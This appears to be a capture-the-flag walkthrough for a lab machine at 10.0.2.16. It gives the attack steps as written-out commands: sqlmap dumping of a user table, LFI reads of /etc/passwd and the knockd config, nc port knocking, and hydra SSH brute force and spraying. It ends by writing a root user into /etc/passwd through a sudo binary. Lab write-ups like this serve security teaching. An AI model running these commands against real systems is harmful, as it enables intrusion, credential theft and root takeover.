> SQL Injection, ssh, Password Spraying

# Ports

* **80** : Default apache setup page
* **22** : Filtered SSH
### Port 80, 22 are used for exploiting

# 80
1. `gobuster` gave /manage.php, /logout.php, /search.php, /results.php, /sessions.php, /display.php, /configure.php
2. /manage.php contains a signin form for managing records for the /display.php
3. Navigating to /configure.php and then going /manage.php gives us an admin cookie.
4. /manage.php now shows the presence of LFI vulnerbility in the footer of the website.
5. /search.php input has an sql injection vulnerability found using `sqlmap`

# 22
1. SSH Filtered found from `nmap` scans
2. `-sS` scan shows filtered and `-A` scan shows closed.
3. Some firewall is blocking the port

# EXPLOITATION

Capture the search request with burp and save the request to a file. This file is used by sqlmap to check for sql injection and enumerate database.

SSH is secured by using technique of  port knocking. `knockd` is used for implementing this. `knockd` config file is located at `/etc/knockd` and contains the rules for unlocking the port. We use the LFI in the /manage.php to obtain the file contents

## sqlmap
1. `sqlmap -r req.txt --dbs`
"sqlmap use the req.txt and enumerate **database**"

2. `sqlmap -r req.txt -D users --tables`
"Get the tables from users database"

3. `sqlmap -r req.txt -D users -t UserDetails --dump`
"Dump the table **UserDetails**

UserDetail table contains info about users and their passwords.
We can get the users in the server by exploiting the LFI vulnerability to get /etc/passwd file.
`10.0.2.16/manage.php/../../../../etc/passwd` shows us that the users in the UserDetail table maybe a part of the server file system.
`10.0.2.16/manage.php/../../../../etc/knockd`  contains ports to knock before ssh opens.

## netcat
`nc 10.0.2.16 9842`, `nc 10.0.2.16 8475`, `nc 10.0.2.16 7469`  in succession opens the ssh port

## hydra
1. Bruteforce the ssh port with login infos obtained from the table
2. `hydra -L users.txt -P pass.txt 10.0.2.16 ssh`
3. We find that only chandlerb, joeyt, janitor had the correct passwords.

# Actions in the low privilege shell

1. `ls -la` on janitor shows a directory containing some passwords.

3. We take this password and does a password spraying with the 3 new passwords on the other users.
`hydra -L users.txt -p password 10.0.2.16 ssh`

4. We find valid password for fredb

5.  Logging in as fredb and checking for `sudo`  capabilities shows us a NOPASSWD for a binary at /opt/devstuff/dist/test/test

6.  The python code for the binary is at /opt/devstuff/test.py there we can see that it requires a file to read and another file to append the content of the read file. `test read.txt append.txt`

7.  Since it can be run with sudo we can write to the /etc/passwd to create a new user with root privileges.

8.  `openssl -passwd -1 -salt 1x1x password1`
"Openssl generate an **md5** hash with using the **passwd** command by adding a **salt string** 1x1x to the password "

9. The generated hash is then used to make a string that is saved in a writable folder, /tmp in this case, as user.txt. Content of this file:
`newuser:$1$1x1x$g2jpxLRY6SfpAIFnYOwIV1:0:0::/root:/bin/bash`

10. Run the /opt/devstuff/dist/test binary:
`sudo test /tmp/user.txt /etc/passwd`

11. Switch to the `newuser` with password as `password1`
`su newuser`
12. We are now root.
